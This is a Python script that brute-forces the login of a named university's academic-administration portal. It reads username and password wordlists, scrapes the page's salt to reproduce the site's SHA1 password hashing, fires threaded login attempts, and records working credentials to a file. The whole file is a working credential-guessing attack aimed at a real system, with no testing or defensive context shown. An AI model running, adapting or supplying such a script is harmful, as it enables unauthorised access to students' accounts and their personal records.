import hashlib
import threading
import time

import requests
from lxml import etree

f = open('result.txt', mode='a+')
file1 = open('username.txt', mode='r', encoding='utf-8')
file2 = open('password.txt', mode='r', encoding='utf-8')


def dump_username():
    dic_username = file1.readlines()
    for i in range(len(dic_username)):
        dic_username[i] = dic_username[i].strip('\n')
    return dic_username


def dump_password():
    dic_password = file2.readlines()
    for i in range(len(dic_password)):
        dic_password[i] = dic_password[i].strip('\n')
    return dic_password


def get_verify(session):
    url = 'http://jwgl.aust.edu.cn/eams/login.action'
    time.sleep(0.2)
    r = session.get(url)
    # print(r.text)
    html = etree.HTML(r.text)
    scripts = html.xpath('//script')
    verification = ''
    for i in range(732, 769):
        verification += scripts[4].text[i]
    # print(verification)
    return verification


def encrypt(session, plain_text):
    salt = get_verify(session)
    res = hashlib.sha1((salt + plain_text).encode('utf-8')).hexdigest()
    return res


def brute(session, username, password):
    # get_verify(session)
    url = 'http://jwgl.aust.edu.cn/eams/login.action'
    headers = {'Origin': 'http://jwgl.aust.edu.cn',
               'Connection': 'close',
               'Referer': 'http://jwgl.aust.edu.cn/eams/login.action'
               }

    data = {'encodedPassword=': '',
            'password': encrypt(session, password),
            'session_locale': 'zh_CN',
            'username': username}
    time.sleep(0.4)
    print(username + '\t' + password, end='\t')
    r = session.post(url=url, headers=headers, data=data)
    html = etree.HTML(r.text)
    x = html.xpath('//span')
    for element in x:
        print(element.text, end='\t')
    print('')
    if x[0].text == '学生':
        f.write(username + '\t' + password)


if __name__ == '__main__':
    i = 1
    for username in dump_username():
        for password in dump_password():
            s = requests.session()
            print(i, end='\t')
            i += 1
            t = threading.Thread(target=brute, args=(s, username, password))
            t.start()
            # brute(s, username, password)
            time.sleep(0.2)
    f.close()
